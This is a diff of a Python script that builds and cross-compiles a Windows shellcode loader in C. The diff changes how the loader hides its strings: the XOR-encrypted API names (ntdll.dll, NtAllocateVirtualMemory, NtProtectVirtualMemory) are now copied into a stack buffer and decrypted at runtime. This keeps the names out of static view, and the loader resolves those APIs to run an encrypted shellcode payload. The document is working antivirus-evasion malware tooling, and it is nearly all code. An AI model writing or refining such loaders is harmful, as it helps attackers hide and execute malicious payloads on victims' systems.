@@ -51,20 +51,25 @@ def xor_c_string(s: str, key: list[int]) -> bytes:
     data = s.encode() + b'\x00'
     return xor_bytes(data, key)
 
-xor_shellcode = xor_bytes(shellcode, key)
-
-ntdll_name = xor_c_string("ntdll.dll", key)
-ntalloc_name = xor_c_string("NtAllocateVirtualMemory", key)
-ntprotect_name = xor_c_string("NtProtectVirtualMemory", key)
-
 def bytes_to_c_array(b: bytes) -> str:
     return ",".join(f"0x{byte:02x}" for byte in b)
 
-shellcode_array = bytes_to_c_array(xor_shellcode)
+# Strings to encrypt
+c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
+xor_c_strings = [xor_c_string(s, key) for s in c_strings]
+
+# Compute offsets for the stack buffer
+offsets = []
+current_offset = 0
+for s in xor_c_strings:
+    offsets.append(current_offset)
+    current_offset += len(s)
+stackbuf_size = current_offset
+
+# Combined encrypted strings for C
+combined_array = bytes_to_c_array(b"".join(xor_c_strings))
+shellcode_array = bytes_to_c_array(xor_bytes(shellcode, key))
 key_array = bytes_to_c_array(key)
-ntdll_array = bytes_to_c_array(ntdll_name)
-ntalloc_array = bytes_to_c_array(ntalloc_name)
-ntprotect_array = bytes_to_c_array(ntprotect_name)
 
 # Generate C loader code
 c_code = f'''#include "winapi_loader.h"
@@ -86,32 +91,33 @@ typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
     PULONG OldProtect
 );
 
-__attribute__((section(".text"))) static char shellcode[] = {{ {shellcode_array} }};
-__attribute__((section(".text"))) static char key[] = {{ {key_array} }};
-
-unsigned char ntdll_dll_enc[] = {{ {ntdll_array} }};
-unsigned char ntallocatevirtualmemory_enc[] = {{ {ntalloc_array} }};
-unsigned char ntprotectvirtualmemory_enc[] = {{ {ntprotect_array} }};
+__attribute__((section(".text"))) static unsigned char shellcode[] = {{ {shellcode_array} }};
+__attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};
 
 __attribute__((section(".text.start")))
 void _start() {{
     SIZE_T size = sizeof(shellcode);
     SIZE_T key_len = sizeof(key);
 
-    for (SIZE_T i = 0; i < sizeof(ntdll_dll_enc); i++)
-        ntdll_dll_enc[i] ^= key[i % key_len];
-    for (SIZE_T i = 0; i < sizeof(ntallocatevirtualmemory_enc); i++)
-        ntallocatevirtualmemory_enc[i] ^= key[i % key_len];
-    for (SIZE_T i = 0; i < sizeof(ntprotectvirtualmemory_enc); i++)
-        ntprotectvirtualmemory_enc[i] ^= key[i % key_len];
+    unsigned char stackbuf[{stackbuf_size}];
+    char* ntdll_dll               = (char*)&stackbuf[{offsets[0]}];
+    char* ntallocatevirtualmemory  = (char*)&stackbuf[{offsets[1]}];
+    char* ntprotectvirtualmemory   = (char*)&stackbuf[{offsets[2]}];
 
-    HMODULE hNtdll = myLoadLibraryA(ntdll_dll_enc);
+    __attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
+    for (SIZE_T i = 0; i < sizeof(enc_strings); i++)
+        stackbuf[i] = enc_strings[i];
+
+    for (SIZE_T i = 0; i < sizeof(stackbuf); i++)
+        stackbuf[i] ^= key[i % key_len];
+
+    HMODULE hNtdll = myLoadLibraryA(ntdll_dll);
 
     NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
-        (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory_enc);
+        (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);
 
     NtProtectVirtualMemory_t pNtProtectVirtualMemory =
-        (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory_enc);
+        (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
 
     LPVOID execMemory = NULL;
     SIZE_T regionSize = size;
@@ -142,7 +148,7 @@ void _start() {{
 }}
 '''
 
-# Compile the code to a temporary exe
+# Compile the code
 compile_cmd = [
     "x86_64-w64-mingw32-gcc",
     "-s", "-nostdlib", "-nostartfiles", "-ffreestanding",
